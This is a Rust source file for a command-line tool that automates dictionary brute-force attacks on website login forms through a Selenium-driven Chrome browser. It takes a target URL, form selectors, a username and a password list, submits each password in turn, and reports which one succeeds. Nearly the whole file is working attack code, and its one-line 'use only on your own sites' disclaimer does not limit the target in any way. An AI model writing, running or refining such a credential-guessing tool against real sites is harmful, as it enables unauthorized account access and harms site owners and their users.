use std::fs::File;
use std::io::{self, BufRead, BufReader};
use std::io::Write;
use std::path::Path;
use std::str;
use std::thread;
use std::time::Duration;

use chrono::prelude::*;
use selenium_webdriver::*;

fn main() {
    println!("
:::'###:::::'######:::'######::'########::'########::'########::::'###::::'##:::'##:
::'## ##:::'##... ##:'##... ##: ##.... ##: ##.... ##: ##.....::::'## ##::: ##::'##::
:'##:. ##:: ##:::..:: ##:::..:: ##:::: ##: ##:::: ##: ##::::::::'##:. ##:: ##:'##:::
'##:::. ##:. ######::. ######:: ########:: ########:: ######:::'##:::. ##: #####::::
:#########::..... ##::..... ##: ##.... ##: ##.. ##::: ##...:::: #########: ##. ##:::
:##.... ##:'##::: ##:'##::: ##: ##:::: ##: ##::. ##:: ##::::::: ##.... ##: ##:. ##::
:##:::: ##:. ######::. ######:: ########:: ##:::. ##: ########: ##:::: ##: ##::. ##:
..:::::..:::......::::......:::........:::..:::::..::........::..:::::..::..::::..::");
    println!("-------------------------------------------------------------------------------------");
    println!("Coded by L14ms1");
    println!("version : 0.1.1b");
    println!("Small disclaimer, you must use this project on your sites not on other people's sites, it only protects your site.");
    println!("-------------------------------------------------------------------------------------");

    // website for bruteforce
    print!("The site you want to try brute-force : ");
    let website = read_input();

    // input username
    print!("Enter the username selector : ");
    let username_input = read_input();

    // input password
    print!("Enter the password selector : ");
    let password_input = read_input();

    // input button
    print!("Enter the button (login) selector : ");
    let form_button = read_input();

    // username to crack
    print!("Enter the username to brute-force : ");
    let username = read_input();

    // dictionary_password
    print!("Enter the path of the password dictionary : ");
    let path_file = read_input();
    print!("Do you want to see Chrome in full operation ? (yes or no) : ");
    let chrome = read_input();
    let mut ch:bool;

    if chrome.replace("\n", "") == "yes" {
        ch = true;
        println!("a chrome page will appear to see what is happening on the site");
    } else {
        ch = false;
        println!("You said no to display a chrome page, no problem you will be able to see the logs");
    }

    brute_force(website, username_input, password_input, form_button, username, path_file, ch);
}


fn read_input() -> String {
    loop {
        let mut v = String::new();
        io::stdout().flush();
        match io::stdin().read_line(&mut v) {
            Ok(_) => {
                if !String::from(&v).is_empty() {
                    break v;
                } else {
                    continue;
                }
            }
            Err(_) => {
                println!("An error has occurred");
                continue;
            }
        }
    }
}

fn brute_force(website: String, username: String, password: String, button: String, user: String, dictionary: String, show_chrome: bool) {
    if website != "" && username != "" && password != "" && button != "" && user != "" && dictionary != "" {
        if Path::new(dictionary.trim()).exists() {
            let mut args = vec![];
            if show_chrome == false {
                args = vec!["--headless", "--disable-popup-blocking", "--disable-extensions"];
            } else {
                args = vec!["--disable-popup-blocking", "--disable-extensions"];
            }
            let mut driver = Browser::start_session(BrowserName::Chrome, args);
            driver.open(&*website).unwrap();
            if let Ok(lines) = read_lines(dictionary.trim()) {
                let mut i = 0;
                for line in lines {
                    if let Ok(pass) = line {
                        let utc: DateTime<Local> = Local::now();
                        let mut input_username = driver.find_element(LocatorStrategy::CSS(string_to_static_str(username.clone()))).unwrap();
                        input_username.send_keys(&*user);
                        let mut input_password = driver.find_element(LocatorStrategy::CSS(string_to_static_str(password.clone()))).unwrap();
                        input_password.send_keys(&*pass);
                        let mut btn = driver.find_element(LocatorStrategy::CSS(string_to_static_str(button.clone()))).unwrap();
                        i += 1;
                        let mut ui: String = i.to_string();
                        btn.click();
                        driver.open(&*website).unwrap();
                        let mut link: String = driver.get_link().unwrap();
                        driver.refresh();
                        thread::sleep(Duration::new(2, 0));
                        link = driver.get_link().unwrap();
                        if website.replace("\n", "") == link {
                            println!("{} [TRIED] => FALSE | [PASSWORD] => {}, [USERNAME] => {}", utc, String::from(pass), user);
                            continue;
                        } else {
                            println!("{} [TRIED] => SUCCESS | [PASSWORD] => {}, [USERNAME] => {}", utc, String::from(pass), user.clone());
                            driver.close_browser();
                            break;
                            io::stdout().flush();
                        }
                    }
                }
            }
        } else {
            println!("The file ({:?}) You put does not exist :/", dictionary);
        }
    } else {
        println!("Please complete all fields ...");
        io::stdout().flush();
    }
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>> where P: AsRef<Path>, {
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn string_to_static_str(s: String) -> &'static str {
    Box::leak(s.into_boxed_str())
}
